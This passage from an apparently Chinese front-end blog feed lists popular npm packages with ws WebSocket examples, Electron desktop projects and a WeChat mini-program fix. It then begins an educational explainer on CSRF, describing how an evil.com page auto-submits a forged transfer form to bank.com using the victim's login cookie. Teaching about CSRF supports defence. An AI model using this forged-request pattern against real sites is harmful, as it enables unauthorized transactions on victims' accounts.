srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/ajv-validator/ajv">https://github.com/ajv-validator/ajv</a></p><p><a name="kKu5N"></a></p><h2 id="10-yallist"><a href="#10-yallist" class="headerlink" title="10. yallist"></a>10. yallist</h2><p>yallist 是一个双向链表的实现。</p><p>yallist 每周下载量：<strong>70,872,400</strong></p><p><strong>GitHub：</strong><a href="https://github.com/isaacs/yallist">https://github.com/isaacs/yallist</a></p><p><a name="ZhJqR"></a></p><h2 id="11-postcss"><a href="#11-postcss" class="headerlink" title="11. postcss"></a>11. postcss</h2><p>PostCSS 是一个允许使用插件转换样式的插件。这些可以检查（lint）你的 CSS，支持 CSS 变量和 Mixins，编译尚未被浏览器广泛支持的先进的 CSS 语法，内联图片，以及其他许多优秀的工具的功能。</p><p>postcss 每周下载量：<strong>67,390,371</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648831685539-9edbd81e-7e37-4a5f-ab26-28c1f0a78225.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648831685539-9edbd81e-7e37-4a5f-ab26-28c1f0a78225.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/postcss/postcss">https://github.com/postcss/postcss</a></p><p><a name="uylsi"></a></p><h2 id="12-rimraf"><a href="#12-rimraf" class="headerlink" title="12. rimraf"></a>12. rimraf</h2><p>rimraf 是 Node.js 的 rm -rf 实用程序。以包的形式包装 rm -rf 命令，用来删除文件和文件夹，不管文件夹是否为空，都可以删除。</p><p>rimraf 每周下载量：<strong>67,101,067</strong></p><p><strong>GitHub：</strong><a href="https://github.com/isaacs/rimraf">https://github.com/isaacs/rimraf</a></p><p><a name="LW1Xq"></a></p><h2 id="13-emoji-regex"><a href="#13-emoji-regex" class="headerlink" title="13. emoji-regex"></a>13. emoji-regex</h2><p>emoji-regex 提供了一个正则表达式来匹配所有 emoji 符号和序列（包括 emoji 的文本表示），符合 Unicode 标准。 它基于 emoji-test-regex-pattern，它生成（在构建时）基于 Unicode 标准的正则表达式模式。 因此，只要将新的表情符号添加到 Unicode 中，就可以轻松更新 emoji-regex。</p><p>emoji-regex 每周下载量：<strong>61,794,047</strong></p><p><strong>GitHub：</strong><a href="https://github.com/mathiasbynens/emoji-regex">https://github.com/mathiasbynens/emoji-regex</a></p><p><a name="o0OnK"></a></p><h2 id="14-mkdirp"><a href="#14-mkdirp" class="headerlink" title="14. mkdirp"></a>14. mkdirp</h2><p><strong>mkdirp</strong> 可以在 Node.js 中像 mkdir -p 一样递归创建目录及其子目录。</p><p>mkdirp 每周下载量：<strong>61,036,270</strong></p><p><strong>GitHub：</strong><a href="https://github.com/isaacs/node-mkdirp">https://github.com/isaacs/node-mkdirp</a></p><p><a name="PRWoc"></a></p><h2 id="15-ws"><a href="#15-ws" class="headerlink" title="15. ws"></a>15. ws</h2><p>ws 是一个简单易用、速度极快且经过全面测试的 WebSocket 客户端和服务器实现。</p><p>ws 每周下载量：<strong>59,114,745</strong><br><a name="URrFe"></a></p><h3 id="Sending-and-receiving-text-data"><a href="#Sending-and-receiving-text-data" class="headerlink" title="Sending and receiving text data"></a>Sending and receiving text data</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">WebSocket</span> <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://www.host.com/path&quot;</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;open&quot;</span>, <span class="keyword">function</span> <span class="title function_">open</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="string">&quot;something&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="keyword">function</span> <span class="title function_">message</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;received: %s&quot;</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="EgnPz"></a></p><h3 id="Sending-binary-data"><a href="#Sending-binary-data" class="headerlink" title="Sending binary data"></a>Sending binary data</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">WebSocket</span> <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://www.host.com/path&quot;</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">on</span>(<span class="string">&quot;open&quot;</span>, <span class="keyword">function</span> <span class="title function_">open</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> array = <span class="keyword">new</span> <span class="title class_">Float32Array</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">    array[i] = i / <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ws.<span class="title function_">send</span>(array);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="tiIAP"></a></p><h3 id="Simple-server"><a href="#Simple-server" class="headerlink" title="Simple server"></a>Simple server</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">WebSocketServer</span> &#125; <span class="keyword">from</span> <span class="string">&quot;ws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wss = <span class="keyword">new</span> <span class="title class_">WebSocketServer</span>(&#123; <span class="attr">port</span>: <span class="number">8080</span> &#125;);</span><br><span class="line"></span><br><span class="line">wss.<span class="title function_">on</span>(<span class="string">&quot;connection&quot;</span>, <span class="keyword">function</span> <span class="title function_">connection</span>(<span class="params">ws</span>) &#123;</span><br><span class="line">  ws.<span class="title function_">on</span>(<span class="string">&quot;error&quot;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">  ws.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>, <span class="keyword">function</span> <span class="title function_">message</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;received: %s&quot;</span>, data);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  ws.<span class="title function_">send</span>(<span class="string">&quot;something&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><br /><strong>GitHub：</strong><a href="https://github.com/websockets/ws">https://github.com/websockets/ws</a></p><p><a name="MZjaW"></a></p><h2 id="16-async"><a href="#16-async" class="headerlink" title="16. async"></a>16. async</h2><p>Async 是一个实用模块，它为使用异步 JavaScript 提供了直接、强大的功能。虽然最初设计用于 Node.js，但是它也可以直接在浏览器中使用。</p><p>async 每周下载量：<strong>56,387,506</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648832709276-11d64c6a-e883-49f3-88ab-88e7b30bddf6.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648832709276-11d64c6a-e883-49f3-88ab-88e7b30bddf6.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/caolan/async">https://github.com/caolan/async</a></p><p><a name="ywOBi"></a></p><h2 id="17-minimist"><a href="#17-minimist" class="headerlink" title="17. minimist"></a>17. minimist</h2><p>minimist 是一个用来解析命令行选项的库。</p><p>minimist 每周下载量：<strong>51,722,555</strong></p><p><strong>GitHub：</strong><a href="https://github.com/substack/minimist">https://github.com/substack/minimist</a></p><p><a name="V6xT8"></a></p><h2 id="18-js-yaml"><a href="#18-js-yaml" class="headerlink" title="18. js-yaml"></a>18. js-yaml</h2><p>js-yaml 是一个用于 JavaScript 的 YAML 1.2 解析器&#x2F;编写器。这是 YAML 的一个实现，一种对人类友好的数据序列化语言。从 PyYAML 端口开始，它完全从头开始重写。现在它非常快，并且支持 1.2 规范。</p><p>js-yaml 每周下载量：<strong>51,863,321</strong></p><p><strong>GitHub：</strong><a href="https://github.com/nodeca/js-yaml">https://github.com/nodeca/js-yaml</a></p><p><a name="nhnSC"></a></p><h2 id="19-form-data"><a href="#19-form-data" class="headerlink" title="19. form-data"></a>19. form-data</h2><p>form-data 是一个用于创建可读”multipart&#x2F;form-data”流的库。可用于向其他 Web 应用程序提交表单和文件上传。</p><p>form-data 每周下载量：<strong>50,307,183</strong></p><p><strong>GitHub：</strong><a href="https://github.com/form-data/form-data">https://github.com/form-data/form-data</a></p><p><a name="B8GiR"></a></p><h2 id="20-lodash"><a href="#20-lodash" class="headerlink" title="20. lodash"></a>20. lodash</h2><p>lodash 是一个 JavaScript 实用工具库，提供一致性，及模块化、性能和配件等功能。Lodash 消除了处理数组的麻烦，从而简化了 JavaScript、 数字、对象、字符串等。它的模块化方法非常适合：迭代数组，对象和字符串、操作和测试值、创建复合功能。</p><p>Lodash 每周下载量：<strong>50,027,873</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648833682253-c41473ee-e0e6-41dd-9420-4eabfe66436b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1648833682253-c41473ee-e0e6-41dd-9420-4eabfe66436b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>GitHub：</strong><a href="https://github.com/lodash/lodash">https://github.com/lodash/lodash</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 热门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨平台桌面项目</title>
      <link href="/2023/06/30/frontend/collection/projects/kua-ping-tai-zhuo-mian-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/kua-ping-tai-zhuo-mian-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>全文概览：</strong><br />1. <strong>windows95：</strong>Electron 中的 Windows 95；<br />2. <strong>drawio-desktop</strong>：基于 Electron 的图表和白板桌面应用；<br />3. <strong>MarkText</strong>：简单而优雅的开源 Markdown 编辑器；<br />4. <strong>Trilium</strong>：分层的笔记应用，专注于建立大型个人知识库；<br />5. <strong>Joplin</strong>：笔记和待办事项应用；<br />6. <strong>lx-music-desktop</strong>：基于 Electron 17 + Vue 3 的音乐软件；<br />7. <strong>YesPlayMusic</strong>：高颜值的第三方网易云播放器；<br />8. <strong>Cider</strong>：全新跨平台 Apple Music 体验；<br />9. <strong>ZY Player</strong>：跨平台桌面端视频资源播放器；<br />10. <strong>Nylas Mail</strong>：可扩展的邮件客户端；<br />11. <strong>PicGo</strong>：用于上传图片并获取图片 URL 链接的工具；<br />12. <strong>Awesome Electron</strong>：Electron 资源汇总；<br /><strong>1. windows95</strong><br />这是一个运行在 Electron 中的 Windows 95，可以在 macOS、Linux 和 Windows 上运行。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663945292896-9847a3fe-39d4-4ed5-98dd-a2ad65e1aee1.png?x-oss-process=image/resize,w_974,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663945292896-9847a3fe-39d4-4ed5-98dd-a2ad65e1aee1.png?x-oss-process=image/resize,w_974,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/felixrieseberg/windows95">https://github.com/felixrieseberg/windows95</a><br /><strong>2. drawio-desktop</strong><br />drawio-desktop 是一个基于 Electron 的图表和白板桌面应用，其可以用于绘制流程图、类图、组织结构图、泳道图、E-R 图等，模板丰富。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663947145746-9dcc9833-20e7-4400-a1e3-3535ff647fc8.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663947145746-9dcc9833-20e7-4400-a1e3-3535ff647fc8.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/jgraph/drawio-desktop">https://github.com/jgraph/drawio-desktop</a></p><p><strong>3. MarkText</strong><br />MarkText 是一个简单而优雅的开源 Markdown 编辑器，专注于速度和可用性。MarkText 具有简单明了的界面，并支持实时预览，让用户可以获得无干扰的写作体验。其支持各种主题，并支持多种笔记模式，可以输出 HTML 和 PDF 文件等。MarkText 支持在 MACOS、Windows、Linux 系统使用。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663945103095-b077dea9-d84c-4958-9c93-c646517986f0.png?x-oss-process=image/resize,w_813,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663945103095-b077dea9-d84c-4958-9c93-c646517986f0.png?x-oss-process=image/resize,w_813,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/marktext/marktext">https://github.com/marktext/marktext</a><br /><strong>4. Trilium</strong><br />Trilium Notes 是一个分层的笔记应用，专注于建立大型个人知识库。其具有以下特性：<br />● 笔记可以排列成任意深的树。单个笔记可以放在树中的多个位置<br />● 丰富的所见即所得笔记编辑功能，包括带有 markdown 自动格式化功能的表格，图像和数学<br />● 支持编辑使用源代码的笔记，包括语法高亮显示<br />● 笔记之间快速导航，全文搜索和笔记挂起<br />● 无缝笔记版本控制<br />● 笔记属性可用于笔记组织，查询和高级脚本编写<br />● 同步与自托管同步服务器<br />● 具有按笔记粒度的强大的笔记加密<br />● 关系图和链接图，用于可视化笔记及其关系<br />● 脚本-请参阅高级展示<br />● 可用性和性能均能很好地扩展至超过 10 万个笔记<br />● 针对智能手机和平板电脑进行触摸优化的移动前端<br />● 夜间主题<br />●Evernote 和 Markdown 导入导出<br />●Web Clipper 可轻松保存 Web 内容</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663945499791-f5d53047-870a-4947-a33c-438dc5cd4bf7.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663945499791-f5d53047-870a-4947-a33c-438dc5cd4bf7.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/zadam/trilium">https://github.com/zadam/trilium</a><br /><strong>5. Joplin</strong><br />Joplin 是一个免费的开源笔记和待办事项应用，可以处理大量组织成笔记本的笔记。笔记是可搜索的，可以直接从应用或自己的文本编辑器复制、标记和修改。笔记采用 Markdown 格式。该应用适用于 Windows、Linux、macOS、Android 和 iOS。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946115666-73304348-7b23-4881-b179-dd8c5b01d7ab.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946115666-73304348-7b23-4881-b179-dd8c5b01d7ab.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/laurent22/joplin">https://github.com/laurent22/joplin</a><br /><strong>6. lx-music-desktop</strong><br />lx-music-desktop 是一个基于 Electron 17 + Vue 3 的音乐软件。其支持在 Windows、Mac OS、Linux、Android 平台上运行。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946003083-64ec22e6-9baa-4cdb-910d-564446ff6d02.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946003083-64ec22e6-9baa-4cdb-910d-564446ff6d02.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/lyswhut/lx-music-desktop">https://github.com/lyswhut/lx-music-desktop</a><br /><strong>7. YesPlayMusic</strong><br />YesPlayMusic 是一个高颜值的第三方网易云播放器，支持 Windows &#x2F; macOS &#x2F; Linux。其具有以下特性：<br />● 使用 Vue.js 全家桶开发<br />● 网易云账号登录（扫码&#x2F;手机&#x2F;邮箱登录）<br />● 支持 MV 播放<br />● 支持歌词显示<br />● 支持私人 FM &#x2F; 每日推荐歌曲<br />● 每日自动签到（手机端和电脑端同时签到）<br />●Light&#x2F;Dark Mode 自动切换<br />● 支持 Touch Bar<br />● 支持 PWA，可在 Chrome&#x2F;Edge 里点击地址栏右边的 ➕ 安装到电脑<br />● 支持 Last.fm Scrobble<br />● 支持音乐云盘<br />● 自定义快捷键和全局快捷键<br />● 支持 Mpris</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946859352-b40af19a-09b5-44df-80b2-32b76aa6cff1.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946859352-b40af19a-09b5-44df-80b2-32b76aa6cff1.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/qier222/YesPlayMusic">https://github.com/qier222/YesPlayMusic</a><br /><strong>8. Cider</strong><br />基于 Electron 和 Vue.js 的全新跨平台 Apple Music 体验，从头开始编写，同时兼顾性能和视觉效果。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946566421-2ec47d12-a920-487b-9947-44117b403e33.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946566421-2ec47d12-a920-487b-9947-44117b403e33.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/ciderapp/Cider">https://github.com/ciderapp/Cider</a><br /><strong>9. ZY Player</strong><br />ZY Player 是一个跨平台桌面端视频资源播放器，其具有以下特性：<br />● 全平台支持：Windows、Mac、Linux<br />● 支持 IPTV, 卫视直播<br />● 视频源支持自定义, 支持导入, 导出<br />● 支持海报模式和列表模式浏览资源<br />● 播放历史, 自动跳转历史进度<br />● 收藏夹支持导入,导出, 支持同步追剧<br />● 支持精简模式, 摸鱼划水<br />● 一键搜索所有资源, 支持历史搜索记录<br />● 导出资源下载链接<br />● 支持第三方播放器播放<br />● 显示豆瓣评分</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946429335-ca041f04-7f21-420b-974c-d52a02d127b9.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946429335-ca041f04-7f21-420b-974c-d52a02d127b9.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/Hunlongyu/ZY-Player">https://github.com/Hunlongyu/ZY-Player</a><br /><strong>10. Nylas Mail</strong><br />Nylas Mail 是一个使用 Electron、React 和 Flux 构建的开源、可扩展的邮件客户端。它被设计为易于扩展，并且有许多第三方插件可以为客户端添加功能。其兼容上百种邮件提供商，作为桌面应用它可以离线运行。适用于 Mac, Windows 和 Linux。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946811228-e124ed96-2260-4728-aae1-203440ec6fab.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663946811228-e124ed96-2260-4728-aae1-203440ec6fab.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/nylas/nylas-mail">https://github.com/nylas/nylas-mail</a><br /><strong>11. PicGo</strong><br />PicGo 是一个用于快速上传图片并获取图片 URL 链接的工具。其具有以下特性：<br />● 支持拖拽图片上传<br />● 支持快捷键上传剪贴板里第一张图片<br />●Windows 和 macOS 支持右键图片文件通过菜单上传 (v2.1.0+)<br />● 上传图片后自动复制链接到剪贴板<br />● 支持自定义复制到剪贴板的链接格式<br />● 支持修改快捷键<br />● 支持插件系统，已有插件支持 Gitee、青云等第三方图床<br />● 支持通过发送 HTTP 请求调用 PicGo 上传（v2.2.0+)</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663948722447-2764875c-530f-4e7e-9c8f-1ac546983671.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663948722447-2764875c-530f-4e7e-9c8f-1ac546983671.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a><br />**12. Awesome Electron **<br />Awesome Electron 是使用 Electron 创建应用的有用资源。包含文章、图书、视频、播客、文档、工具等资源。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663947665244-a6afd01d-db41-4b0b-8690-95d9aa5a0e9d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1663947665244-a6afd01d-db41-4b0b-8690-95d9aa5a0e9d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/sindresorhus/awesome-electron">https://github.com/sindresorhus/awesome-electron</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 桌面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序文件预览</title>
      <link href="/2023/06/29/solution/wei-xin-xiao-cheng-xu-wen-jian-yu-lan/"/>
      <url>/2023/06/29/solution/wei-xin-xiao-cheng-xu-wen-jian-yu-lan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h3 id="wx-previewMedia-安卓浏览视频第一次点击无反应-无法播放"><a href="#wx-previewMedia-安卓浏览视频第一次点击无反应-无法播放" class="headerlink" title="wx.previewMedia 安卓浏览视频第一次点击无反应 无法播放"></a>wx.previewMedia 安卓浏览视频第一次点击无反应 无法播放</h3><h4 id="官方文档：https-developers-weixin-qq-com-miniprogram-dev-api-media-image-wx-previewMedia-html"><a href="#官方文档：https-developers-weixin-qq-com-miniprogram-dev-api-media-image-wx-previewMedia-html" class="headerlink" title="官方文档：https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewMedia.html"></a>官方文档：<a href="https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewMedia.html">https://developers.weixin.qq.com/miniprogram/dev/api/media/image/wx.previewMedia.html</a></h4><p><img src="https://img1.imgtp.com/2023/06/29/xjE2Ljjp.png" class="lazyload placeholder" data-srcset="https://img1.imgtp.com/2023/06/29/xjE2Ljjp.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>去掉 poster，安卓第一次可以正常预览</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 小程序 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 解决方案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF _ XSRF</title>
      <link href="/2023/06/29/frontend/security/csrf-xsrf/"/>
      <url>/2023/06/29/frontend/security/csrf-xsrf/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>一、Cross-site request forgery&#x2F;ˈfɔːrdʒəri&#x2F;，跨站请求伪造，通常缩写为 CSRF 或 XSRF，它利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p><p><a name="CI4BY"></a></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一、下面先介绍一下 CSRF 攻击的原理：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902169133-e388543f-dcdf-4086-bb78-adbd478f7264.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_12,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902169133-e388543f-dcdf-4086-bb78-adbd478f7264.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_12,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p>二、完成 CSRF 攻击必须要有三个条件：<br />● 用户已经登录了站点 A，并在本地记录了 cookie<br />● 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点 A)。<br />● 站点 A 没有做任何 CSRF 防御</p><table><thead><tr><th>【示例】当我们登入转账页面后，突然眼前一亮惊现”XXX 隐私照片，不看后悔一辈子”的链接，耐不住内心躁动，立马点击了该危险的网站（页面代码如下图所示），但当这页面一加载，便会执行 submitForm 这个方法来提交转账请求，从而将 10 块转给黑客。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902188333-5a3f40d6-da3d-4274-9676-69a65f2f9438.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_16,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_548,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/355497/1646902188333-5a3f40d6-da3d-4274-9676-69a65f2f9438.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_16,text_QGFTdW5jYXQ=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10/resize,w_548,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></th></tr></thead></table><table><thead><tr><th>【示例】你登录了 bank.com 网站。此时：你有了来自该网站的身份验证 cookie。你的浏览器会在每次请求时将其发送到 bank.com，以便识别你，并执行所有敏感的财务上的操作。<br />现在，在另外一个窗口中浏览网页时，你不小心访问了另一个网站 evil.com。该网站具有向 bank.com 网站提交一个具有启动与黑客账户交易的字段的表单<form action="https://bank.com/pay">的 JavaScript 代码。<br />你每次访问 bank.com 时，浏览器都会发送 cookie，即使该表单是从 evil.com 提交过来的。因此，银行会识别你的身份，并执行真实的付款。</th></tr></thead></table><table><thead><tr><th>【示例】跨站攻击示意图<br />上图中攻击者利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。<br /><img 